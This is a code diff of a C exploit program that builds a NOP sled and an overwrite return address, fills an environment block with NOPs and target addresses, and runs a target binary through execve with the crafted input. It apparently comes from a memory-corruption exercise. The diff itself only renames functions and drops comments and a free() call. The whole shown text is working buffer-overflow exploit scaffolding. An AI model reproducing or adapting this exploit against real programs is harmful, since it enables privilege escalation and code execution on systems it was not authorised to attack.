@@ -15,17 +15,16 @@ const int DIFF = 4;
 const uint32_t A1 = BASE + DIFF;
 const uint32_t A2 = BASE + 2 * DIFF;
 
-// Redefine sled and address
 const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
 const char* ADD = "\xc0\xde\xff\xff";
 
-char* prepBuf() {
+char* prepB() {
     char* buf = malloc(strlen(SLED) + strlen(ADD) + 1);
     sprintf(buf, "%s%s", SLED, ADD);
     return buf;
 }
 
-void prepEnv(char *e) {
+void prepE(char *e) {
     memset(e, NOP, ESIZE - 1);
     *((uint32_t *)(e)) = A1;
     *((uint32_t *)(e + DIFF)) = A2;
@@ -34,18 +33,16 @@ void prepEnv(char *e) {
 }
 
 int main(void) {
-    char *buf = prepBuf();
+    char *buf = prepB();
     char *args[] = {TARGET, buf, NULL};
     char env[ESIZE];
 
-    prepEnv(env);
+    prepE(env);
 
     char *envp[] = {env};
 
     execve(TARGET, args, envp);
     fprintf(stderr, "execve failed.\n");
-    
-    free(buf); // Free the allocated memory for buf
 
     return 0;
 }
